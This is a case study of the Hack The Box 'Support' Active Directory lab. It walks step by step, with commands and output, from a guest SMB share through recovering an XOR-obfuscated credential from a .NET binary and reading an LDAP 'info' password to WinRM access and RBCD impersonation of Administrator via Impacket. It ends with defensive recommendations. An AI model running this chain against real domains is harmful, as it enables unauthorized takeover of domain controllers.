---
title: "Support — Embedded Credentials and RBCD Domain Compromise"
description: "Guest-accessible tooling, reversible credential obfuscation, and excessive computer-object permissions form a path to privileged access."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - credential-management
  - access-control
objective: "Assess how a guest-readable utility, reversible credential obfuscation, exposed directory attributes, and delegated computer-object permissions combine into domain compromise."
tools:
  - NetExec
  - smbclient
  - strings
  - ldapsearch
  - BloodHound
  - Impacket
  - evil-winrm
  - python3
skill: "Active Directory enumeration and Resource-Based Constrained Delegation abuse"
outcome: "Authenticated WinRM access via a directory-disclosed credential, then `nt authority\\system` on the domain controller through RBCD"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Windows Active Directory lab; domain controller running Windows Server (build 10.0.20348) |
| Starting position | Unauthenticated network access with a guest-readable SMB share |
| Objective | Assess how a guest-readable utility, reversible credential obfuscation, exposed directory attributes, and delegated computer-object permissions combine into domain compromise |
| Outcome | Authenticated WinRM access, then `nt authority\system` on the domain controller via RBCD |

## Guest tooling to RBCD impersonation

Support is an Easy-rated Hack The Box Windows Active Directory lab. A guest-readable SMB share exposes a .NET utility that hides its LDAP service credential behind a reversible transformation; the recovered credential enables full directory enumeration, which discloses a second plaintext password in a user's `info` attribute. That password yields WinRM access, and a group membership granting `GenericAll` over the domain-controller computer object opens a resource-based constrained delegation (RBCD) path to `Administrator`. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Guest SMB share → embedded credential recovery from a .NET binary → LDAP enumeration → plaintext `info` attribute password → WinRM access → `GenericAll` on the domain-controller object → RBCD impersonation of `Administrator` → `nt authority\system`**

## Guest-readable share on a lab domain controller

- **Target:** a Windows Active Directory lab domain (`<DOMAIN>`) whose domain controller runs Windows Server (build 10.0.20348).
- **Exposed services:** standard Active Directory services, including SMB, LDAP, and WinRM.
- **Starting position:** unauthenticated network access with a guest-readable SMB share.
- **Objective:** assess how a leaked client utility, weak credential protection, directory-data exposure, and delegated computer-object permissions combine into domain compromise.
- **Constraints:** activity stayed inside the Hack The Box lab environment.

## Evidence: guest share binary, directory disclosure, RBCD impersonation

### 1. Guest-Readable SMB Share

Observation: unauthenticated (guest) SMB enumeration reveals a share readable without credentials.

Action: enumerate shares as a guest, then list the readable share's contents.

```bash
nxc smb <DOMAIN> -u 'a' -p '' --shares
```

```text
<TOOL_SHARE>   READ
```

```bash
smbclient //<DOMAIN>/<TOOL_SHARE> -U '%' -c 'ls'
```

```text
<UTILITY_ARCHIVE>
```

Significance: a share readable by unauthenticated guests exposes internal compiled tooling to anyone on the network.

Result: the guest-readable share yields a .NET utility archive for offline analysis.

### 2. Recover the Embedded LDAP Credential

Observation: `<UTILITY_ASSEMBLY>` is a .NET assembly that queries LDAP using a hardcoded, obfuscated password.

Action: inspect the assembly (`strings` or a decompiler) and reverse the transformation offline. The decompiled routine stores an encoded value and a static key, then applies a reversible byte operation:

```csharp
private static string enc_password = "<ENCODED_VALUE>";
private static byte[] key = Encoding.ASCII.GetBytes("<XOR_KEY>");

array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
```

Reversing the routine recovers the credential:

```python
data = base64.b64decode("<ENCODED_VALUE>")
key = b"<XOR_KEY>"
result = bytes([data[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(data))])
```

Validating the recovered credential over LDAP proves recovery:

```bash
nxc ldap <DOMAIN> -u '<LDAP_USER>' -p '<LDAP_PASSWORD>'
```

```text
[+] <DOMAIN>\<LDAP_USER>:<LDAP_PASSWORD>
```

Significance: a static algorithm and an embedded key provide no meaningful protection: any user who can read the binary can reverse it. The `^ 0xDF` constant against a repeating key is trivially reproducible.

Result: the LDAP service credential is recovered and validated, and it grants full directory enumeration.

### 3. LDAP Enumeration Discloses a Directory-Stored Password

Observation: with the LDAP service credential, full directory enumeration is possible; a user object exposes a plaintext password in its `info` attribute.

Action: query the directory for the `info` attribute, then validate the disclosed credential.

```bash
ldapsearch -x -H ldap://<DOMAIN> \
  -D '<LDAP_USER>@<DOMAIN>' \
  -w '<LDAP_PASSWORD>' \
  -b '<BASE_DN>' \
  '(objectClass=user)' info sAMAccountName | grep -A2 "info:"
```

```text
sAMAccountName: <LAB_USER>
info: <LAB_USER_PASSWORD>
```

```bash
nxc smb <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>'
```

```text
[+] <DOMAIN>\<LAB_USER>:<LAB_USER_PASSWORD>
```

Significance: any authenticated domain user can read the `info` attribute by default, so a password placed there is exposed to every account in the domain.

Result: a plaintext account password is recovered from the directory and validates over SMB.

### 4. WinRM Access

Observation: the recovered account has remote-management access.

Action: I checked WinRM access, then opened an interactive shell.

```bash
nxc winrm <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>'
```

```text
[+] <DOMAIN>\<LAB_USER>:<LAB_USER_PASSWORD> (Pwn3d!)
```

```bash
evil-winrm -i <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>'
```

Significance: WinRM provides an authenticated interactive shell and the first foothold on the domain controller.

Result: WinRM access is confirmed as `<LAB_USER>`.

### 5. Domain Privilege Escalation: RBCD

Observation: `<LAB_USER>` belongs to a group with `GenericAll` over the domain-controller computer object. `GenericAll` includes write access to `msDS-AllowedToActOnBehalfOfOtherIdentity`, the attribute that governs resource-based constrained delegation.

Action: enumerate the directory relationship with BloodHound, then perform the delegation chain.

```bash
bloodhound-ce-python -d <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER_PASSWORD>' -c all -ns <TARGET_IP>
```

Add an attacker-controlled computer account:

```bash
impacket-addcomputer -method SAMR \
  -computer-name '<ATTACKER_COMPUTER>$' \
  -computer-pass '<ATTACKER_COMPUTER_PASSWORD>' \
  -dc-host <DC_FQDN> \
  -domain-netbios <DOMAIN_NETBIOS> \
  '<DOMAIN>/<LAB_USER>:<LAB_USER_PASSWORD>'
```

Configure RBCD to delegate from the attacker computer to the domain controller:

```bash
impacket-rbcd \
  -delegate-from '<ATTACKER_COMPUTER>$' \
  -delegate-to '<DC_COMPUTER>$' \
  -action 'write' \
  '<DOMAIN>/<LAB_USER>:<LAB_USER_PASSWORD>'
```

```text
[*] Delegation rights modified successfully!
[*] <ATTACKER_COMPUTER>$ can now impersonate users on <DC_COMPUTER>$ via S4U2Proxy
```

Request a service ticket impersonating `Administrator`:

```bash
getST.py \
  -spn 'cifs/<DC_FQDN>' \
  -impersonate 'Administrator' \
  '<DOMAIN>/<ATTACKER_COMPUTER>$:<ATTACKER_COMPUTER_PASSWORD>' \
  -dc-ip <TARGET_IP>
```

```text
[*] Saving ticket in <TICKET_CCACHE>
```

Use the ticket for privileged access:

```bash
export KRB5CCNAME=<TICKET_CCACHE>
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
```

```text
Microsoft Windows [Version 10.0.20348.859]
C:\Windows\system32> whoami
nt authority\system
```

Significance: write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` lets an attacker configure RBCD and impersonate arbitrary users, including `Administrator`, on the target computer without exploiting any software vulnerability.

Result: the delegated ticket yields `nt authority\system` on the domain controller.

## Two obstacles: the reversible credential and the CVE-free escalation

| Challenge | Decision | Rationale |
|---|---|---|
| Credential hidden behind a reversible transformation | Analyzed the assembly statically | Reversing the stored algorithm and key recovered the credential |
| Privilege escalation without a CVE | Abused the granted write permission to configure RBCD | Only a misconfigured delegation permission was required, not a software flaw |

## Outcome: WinRM foothold and SYSTEM via RBCD

The source notes document authenticated WinRM access as `<LAB_USER>` and `nt authority\system` on the domain controller through resource-based constrained delegation. The directory relationship is recorded from the source notes and not reproduced here.

## Recommendations: embedded credentials, info attributes, computer ACLs, and guest shares

This case study did not re-test any of the actions below.

1. **Do not embed credentials in client binaries.** The LDAP service credential sat behind a static algorithm and an embedded key, so anyone who could read the utility could recover it. *Recommendation:* store service credentials in a secrets manager or Windows Credential Manager, or move to certificate-based LDAP binding.
2. **Never store passwords in directory attributes.** A plaintext password in the `info` attribute was readable by every authenticated domain user and yielded WinRM access. *Recommendation:* keep secrets out of `info`, `description`, and `comment`, and restrict read access with the attribute's security descriptor.
3. **Audit write permissions on computer objects.** `GenericAll` over the domain-controller object included write access to `msDS-AllowedToActOnBehalfOfOtherIdentity`, enabling RBCD impersonation of `Administrator`. *Recommendation:* remove unnecessary permissions on computer objects and run BloodHound regularly to find such paths.
4. **Restrict guest-accessible shares.** A share readable by unauthenticated guests exposed compiled internal tooling. *Recommendation:* require authentication and keep internal utilities out of guest-readable shares.

## References

- [Hack The Box — Support](https://app.hackthebox.com/machines/Support) (retired machine)
- [msDS-AllowedToActOnBehalfOfOtherIdentity attribute (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)
- [info attribute (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/adschema/a-info)
- [smbclient — Samba manual page](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [ldapsearch — OpenLDAP manual page](https://www.openldap.org/software/man.cgi?query=ldapsearch)
- [strings — GNU Binutils documentation](https://sourceware.org/binutils/docs/binutils/strings.html)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [BloodHound](https://github.com/SpecterOps/BloodHound)
- [Impacket](https://github.com/fortra/impacket)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
